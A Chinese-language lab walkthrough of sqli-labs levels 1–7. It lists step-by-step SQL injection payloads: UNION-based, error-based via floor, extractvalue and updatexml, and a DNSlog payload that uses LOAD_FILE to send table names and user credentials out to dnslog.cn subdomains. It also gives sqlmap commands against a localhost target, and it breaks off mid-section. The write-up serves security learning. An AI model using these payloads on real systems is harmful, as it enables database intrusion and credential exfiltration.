<p>作者的总结：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/142738173" title="SQL注入学习总结_sql注入csdn-CSDN博客">SQL注入学习总结_sql注入csdn-CSDN博客</a></p>
<p>sqli-labs安装与配置可以参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/271772.html" title="SQL注入之sqli-labs（安装与配置） - FreeBuf网络安全行业门户">SQL注入之sqli-labs（安装与配置） - FreeBuf网络安全行业门户</a></p>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="手工UNION联合查询注入"><a href="#手工UNION联合查询注入" class="headerlink" title="手工UNION联合查询注入"></a>手工UNION联合查询注入</h3><p>首页面</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935977.png" srcset="/img/loading.gif" lazyload></p>
<p>在输入框按提示输入   </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1<br></code></pre></td></tr></table></figure>

<p>有回显，尝试多次，发现id从1开始输出不同的用户，如id&#x3D;1时，有用户名Dump</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935159.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=&#x27;<br></code></pre></td></tr></table></figure>

<p>输入单引号，页面报错，You have an error in your SQL syntax;</p>
<p>应该是有注入漏洞，当然，这里肯定有注入漏洞</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935026.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2<br></code></pre></td></tr></table></figure>

<p>似乎是字符型注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935816.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;<br></code></pre></td></tr></table></figure>

<p>报错   ‘ ‘1’’ LIMIT 0,1 ‘  ，可以看出输入了1‘，根据报错信息确定咱们输入内容放到一对单引号中，脑补一下咱们输入的内容在数据库出现的位置：select … from … where id&#x3D;’1’  LIMIT 0,1 ……，确定是字符型注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935896.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3--+</span><br></code></pre></td></tr></table></figure>

<p>递增尝试，从<code>select 1 --+</code>到<code>select 1,2,3 --+</code>，到3时没有报错但为什么没显示1，2，3？</p>
<p>这里就涉及到了联合查询的一个知识点，如果联合查询前面条件为真，后面语句就不执行了，所以我们需要让联合查询前面条件为假，怎么让联合查询为假？</p>
<p>我们可以直接使用-1，或者是使用更大的数字，但是-1肯定不存在，因为id一般是无符号整型，经尝试，0也可以。</p>
<p>还要注意转义，空格转义成<code>+</code>，<code>-- </code>应写为<code>--+</code>（所有get传参中，都要进行url编码。<code>+</code>在url编码中代表空格<code> </code>）</p>
<p>在线URL 编码&#x2F;解码工具：<a target="_blank" rel="noopener" href="https://www.toolhelper.cn/EncodeDecode/Url" title="URL 编码&#x2F;解码 - 锤子在线工具">URL 编码&#x2F;解码 - 锤子在线工具</a></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935014.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure>

<p>换成0后，联合查询前面的条件为假，我们再次逐次尝试，发现select 1,2,3时能够正常显示，表明有3项数据传回，其中1所在位置不显示，2所在位置显示在Your Login name: ，3所在位置显示在Your Password: 。可以在2，3所在位置下手。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935774.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</span><br></code></pre></td></tr></table></figure>

<p>爆表名</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935899.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>

<p>爆列名</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935252.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password),3 from users --+</span><br></code></pre></td></tr></table></figure>

<p>爆用户数据，其实与之前id一一对应，id&#x3D;1时，正是用户Dump</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936505.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="手工报错型注入"><a href="#手工报错型注入" class="headerlink" title="手工报错型注入"></a>手工报错型注入</h3><p><strong>法一、floor()报错注入</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936873.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="hljs-string">&#x27;),floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936335.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="hljs-string">&#x27;),floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936395.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></code></pre></td></tr></table></figure>

<p>发现显示了id&#x3D;1的用户Dump，而不是报错注入，改一改id试试？</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936830.png" srcset="/img/loading.gif" lazyload></p>
<p> 改了之后虽然用户数据全部出来，但仍不是报错型注入（未从报错中显示），不符合我们的期望。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936664.png" srcset="/img/loading.gif" lazyload></p>
<p>  <code>limit 0,1</code>从第一行开始显示一行数据</p>
<p>这才是报错型注入，可用limit逐行输出</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select concat(username, &#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936644.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>法二、extractValue()报错注入</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database()))) --+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936564.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936139.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure>

<p>查询后发现不是我们想要的，可能是查错表了</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936518.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>users<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure>

<p>加上库名，防止有重名的表</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936203.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users)))--+</span><br></code></pre></td></tr></table></figure>

<p>发现查的不全，默认只能返回32个字符，可以用substring()函数解决</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936469.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,substring((select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),1,32))) --+</span><br></code></pre></td></tr></table></figure>

<p>用substring先查32个字符</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936892.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,substring((select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),32,32))) --+</span><br></code></pre></td></tr></table></figure>

<p>再查32个，依次往下查</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936142.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>法三、updateXml()报错注入</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(database())),&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936666.png" srcset="/img/loading.gif" lazyload></p>
<p>后续与extractValue()报错注入相似</p>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>查不出来，似乎是数字型注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936593.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<p>报错  ‘’ LIMIT 0,1’  ，输入的内容直接放在数据库里，是所谓的数字型注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937329.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>不加单引号也能查，确定是数字型注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937822.png" srcset="/img/loading.gif" lazyload></p>
<p>后续步骤相似，仅把第一题?id&#x3D;0后面的单引号去掉</p>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<p>报错  ‘’1’’) LIMIT 0,1’  ，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，脑补一下咱们输入1在数据库语句中的位置，形如select … from … where id&#x3D;(‘1’) LIMIT 0,1  …</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937251.png" srcset="/img/loading.gif" lazyload></p>
<p>后续步骤相似，仅把第一题?id&#x3D;0’的后面加上)</p>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure>

<p>报错  <code>&#39;&quot;1&quot;&quot;) LIMIT 0,1&#39;</code>  ，包裹在(“”)中</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937082.png" srcset="/img/loading.gif" lazyload></p>
<p>后续步骤类似，仅把第一题?id&#x3D;1的后面改为”)</p>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><h3 id="手工报错注入"><a href="#手工报错注入" class="headerlink" title="手工报错注入"></a>手工报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>不再显示用户名与密码，UNION联合查询型注入不能用了，估计要用报错注入或盲注。</p>
<p>先来报错注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937760.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure>

<p>还好，报错注入还好使，（报错也是一种回显，可以借此显示出我们想要的信息）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937918.png" srcset="/img/loading.gif" lazyload></p>
<p>剩下步骤不再重复</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注比较繁琐，往往会用sqlmap等自动注入工具。但是盲注会发送大量请求，占用服务器，容易被禁ip，往往不被优先考虑。</p>
<p>这里先不引入工具的使用。小伙伴们最好不要过度依赖工具，工具确实是强大、方便的，前面几个题用工具的话很容易出用户数据，但只使用工具的话和没学一样，练熟练基本功才会有后续提升。</p>
<p>而且对于盲注来说，能自己写出脚本才能算真正学会。</p>
<p><strong>sqlmap盲注步骤详见less-7。</strong></p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure>

<p>是用双引号闭合</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937000.png" srcset="/img/loading.gif" lazyload></p>
<p>报错注入或时间盲注（以报错注入为例，盲注的例子可以看less-7）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; and extractvalue(1,concat(0x7e,(select database()))) --+<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937481.png" srcset="/img/loading.gif" lazyload></p>
<p>然后就是常规流程</p>
<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><h3 id="DNS-log注入"><a href="#DNS-log注入" class="headerlink" title="DNS log注入"></a>DNS log注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<p>报语法错误，但不能看出有用信息</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937488.png" srcset="/img/loading.gif" lazyload></p>
<p>试了试，报错注入不能用了，因为报不出有用信息。</p>
<p>按常规考虑，应该进行布尔盲注或者时间盲注，但是盲注一般使用sqlmap跑，不能有效训练我们。</p>
<p>难道这里只能用工具了吗？</p>
<p>当然不，我们这里用一个巧妙地方法——DNSlog注入，这种方法相对于盲注来说请求个数更少（和常规注入个数一样），可以手动操作（减少禁ip的风险）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>                  You <span class="hljs-keyword">are</span> in.... Use outfile......提示用文件<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;             回显You have an error in your SQL syntax，不告诉我们哪里错了，看不见闭合</span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-comment">--+              回显You have an error in your SQL syntax</span><br> <br>...<br> <br>...<br> <br>...<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;))--+            You are in.... Use outfile...... </span><br></code></pre></td></tr></table></figure>

<p>说明是字符型注入闭合是<code>&#39;))</code></p>
<p>不知道为啥<code>?id=1&#39;‘--+</code>这里也可以，但后续步骤又不行，大家这步可以讨论一下</p>
<p><strong>正式开始注入</strong></p>
<p>尝试用and去注入不太行，换成union</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;)) union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(SELECT HEX(database())),&#x27;</span>.qefbk8.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937381.png" srcset="/img/loading.gif" lazyload></p>
<p>随便找个<strong>在线16进制字符串转换工具</strong>进行转换</p>
<p><a target="_blank" rel="noopener" href="https://tool.hiofd.com/hex-convert-string-online/" title="在线16进制字符串转换工具 - 在线工具网">在线16进制字符串转换工具 - 在线工具网</a></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937924.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;)) union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,substr((SELECT HEX((select group_concat(table_name) from information_schema.tables where table_schema = database()))),1,63),&#x27;</span>.ms5sju.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937122.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937113.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;)) union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,substr((SELECT HEX((select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>users<span class="hljs-string">&#x27;))),1,63),&#x27;</span>.ms5sju.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937821.png" srcset="/img/loading.gif" lazyload><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937089.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;)) union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,substr((SELECT HEX((select group_concat(username,&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,password) from users ))),1,63),&#x27;</span>.ms5sju.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937456.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937514.png" srcset="/img/loading.gif" lazyload></p>
<p>DNS log注入还有别的应用方法（可以了解一下）：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_47306547/article/details/119833568?spm=1001.2014.3001.5501" title="sqli-labs-master 过关 1-10 （附解题思路及各注入方法解析）_lfi-labs-master闯关-CSDN博客">sqli-labs-master 过关 1-10 （附解题思路及各注入方法解析）_lfi-labs-master闯关-CSDN博客</a></p>
<h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><p>直接用sqlmap。</p>
<p>检测「注入点」</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>输入后会问几个问题，根据情况做出选择（影响不大），如果懒得答，加上–batch 参数（–batch：进行默认选择，不需要手动输入YES or NO）。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--batch</span><br></code></pre></td></tr></table></figure>

<p>扫出布尔盲注、时间盲注漏洞</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938851.png" srcset="/img/loading.gif" lazyload></p>
<p>查看当前使用的数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938025.png" srcset="/img/loading.gif" lazyload></p>
<p>查看「数据表」</p>
